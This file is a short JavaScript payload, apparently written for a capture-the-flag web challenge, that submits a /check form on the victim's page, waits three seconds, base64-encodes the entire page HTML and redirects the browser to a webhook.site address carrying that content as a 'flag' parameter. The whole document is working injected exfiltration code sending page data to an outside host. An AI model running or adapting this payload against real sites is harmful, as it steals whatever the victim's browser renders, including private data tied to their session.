// payload16.js
(() => {
  const btn = document.querySelector('form[action="/check"] button[type="submit"]');
  if (btn) {
    btn.click(); // Step 1: Submit the /check form
  }

  // Step 2: Wait for the flag to be rendered after redirect
  setTimeout(() => {
    const html = document.documentElement.innerHTML;
    const encoded = btoa(html);
    location.href = "https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?flag=" + encoded;
  }, 3000); // wait 3s to ensure flag renders
})();
